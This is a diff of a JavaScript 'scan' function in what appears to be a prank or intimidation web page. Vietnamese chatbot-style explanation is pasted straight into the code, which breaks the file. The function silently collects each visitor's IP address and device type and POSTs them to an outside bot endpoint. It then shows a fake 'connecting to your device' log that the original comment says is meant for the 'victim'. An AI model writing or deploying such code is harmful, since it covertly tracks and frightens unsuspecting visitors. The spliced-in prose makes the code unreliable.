@@ -434,23 +434,22 @@
             }, delayMs);
         }
 
-       async function scan(ans) {
-    // 1. Kiểm tra thư viện UAParser đã tải xong chưa
-    if (typeof UAParser === 'undefined') {
-        console.error("Thư viện UAParser chưa được tải!");
-        return;
-    }
+       Lỗi này xác nhận rằng mặc dù bạn đã thêm thẻ <script> vào file HTML, nhưng trình duyệt vẫn không nhận diện được biến UAParser. Điều này thường xảy ra khi thư viện yêu cầu cách gọi đặc biệt hoặc bị xung đột.
 
-    const parser = new UAParser();
-    const result = parser.getResult();
-    
-    // Logic lấy tên thiết bị
-    let deviceName = "Desktop";
-    if (result.device.type === 'mobile' || result.device.type === 'tablet') {
-        deviceName = `${result.device.vendor || ''} ${result.device.model || 'Mobile Device'}`;
-    } else if (result.os.name === 'iOS' || result.os.name === 'Android') {
-        deviceName = `${result.os.name} Device`;
-    }
+Để giải quyết triệt để và bỏ qua việc phụ thuộc vào thư viện bên ngoài (vì thư viện này đang gây khó dễ cho bạn), chúng ta sẽ sử dụng navigator.userAgent có sẵn của trình duyệt. Cách này 100% không bao giờ bị lỗi "chưa tải được thư viện".
+
+Thay thế toàn bộ hàm scan bằng đoạn code này:
+JavaScript
+async function scan(ans) {
+    // 1. Tự lấy thông tin bằng trình duyệt (không cần thư viện ngoài)
+    const ua = navigator.userAgent;
+    let deviceName = "Unknown Device";
+
+    if (/iPhone/i.test(ua)) deviceName = "iPhone";
+    else if (/Android/i.test(ua)) deviceName = "Android Device";
+    else if (/iPad/i.test(ua)) deviceName = "iPad";
+    else if (/Macintosh/i.test(ua)) deviceName = "MacBook/Desktop";
+    else if (/Windows/i.test(ua)) deviceName = "Windows PC";
 
     // 2. Lấy IP
     let userIp = "Hidden";
@@ -462,17 +461,22 @@
         console.log("Không lấy được IP");
     }
 
-    // 3. Gửi dữ liệu về bot (Phần này bạn đã bị xóa mất)
-    await fetch('https://mybot-lfij.onrender.com/log-visitor', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-            ip: userIp, 
-            device: deviceName 
-        })
-    });
+    // 3. Gửi dữ liệu về bot
+    try {
+        await fetch('https://mybot-lfij.onrender.com/log-visitor', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                ip: userIp, 
+                device: deviceName 
+            })
+        });
+        console.log("Gửi thành công:", { ip: userIp, device: deviceName });
+    } catch (err) {
+        console.error("Lỗi gửi về bot:", err);
+    }
 
-    // 4. Hiệu ứng log hiển thị cho nạn nhân
+    // 4. Hiệu ứng log
     document.getElementById('log').innerHTML = '';
     addLine('<span class="log-scanning">Đang kết nối đến thiết bị...</span>', '', 0);
     addLine('<span class="log-result">Đã xác định: ' + deviceName + '</span>', '', 1500);
